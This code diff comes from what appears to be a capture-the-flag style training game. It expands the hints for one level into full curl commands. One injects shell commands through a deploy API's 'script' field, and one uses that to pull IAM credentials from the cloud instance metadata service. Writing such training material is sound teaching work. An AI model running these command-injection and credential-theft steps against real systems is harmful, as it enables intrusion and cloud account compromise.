@@ -194,8 +194,8 @@ export const campaignLevel2: ChainDef = {
       hints: [
         "Recon first — `nmap -sV <ip>`.",
         `Authenticate to the deploy API's trigger endpoint with the key from Ashcroft's log — \`curl -H "X-Deploy-Key: ${DEPLOY_KEY}" https://<ip>/api/deploy/trigger\`.`,
-        "The trigger endpoint accepts a 'script' field it runs as part of the deploy — that's not a config value, that's command execution with extra steps.",
-        "Once you have execution, check what cloud role this host is running as — `curl` the instance metadata service, same trick as always.",
+        `The trigger endpoint accepts a 'script' field it runs as part of the deploy — that's not a config value, that's command execution with extra steps: \`curl -X POST -H "X-Deploy-Key: ${DEPLOY_KEY}" https://<ip>/api/deploy/trigger -d "script=id"\`.`,
+        `Once you have execution, check what cloud role this host is running as — same trick as always: \`curl -X POST -H "X-Deploy-Key: ${DEPLOY_KEY}" https://<ip>/api/deploy/trigger -d "script=curl 169.254.169.254/latest/meta-data/iam/security-credentials/"\`.`,
       ],
       debrief: [
         "root cause: the deploy API trusted any request bearing a valid deploy key to specify an arbitrary",
